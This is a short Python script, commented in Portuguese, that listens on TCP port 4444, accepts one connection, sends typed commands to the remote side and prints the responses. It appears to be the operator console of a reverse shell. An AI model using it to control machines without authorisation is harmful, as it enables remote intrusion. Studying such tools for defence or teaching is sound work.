import socket

# Criação do socket do servidor
servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servidor.bind(('0.0.0.0', 4444))  # Aceita conexões de qualquer IP
servidor.listen(1)

print("[*] Aguardando conexão...", flush = True)
conn, addr = servidor.accept()
print(f"[*] Conectado por {addr}")

while True:
    comando = input("Comando para enviar: " )
    conn.send(comando.encode())

    if comando.lower() == 'sair':
        break

    resposta = conn.recv(1024).decode()
    print("Resposta:", resposta)

conn.close()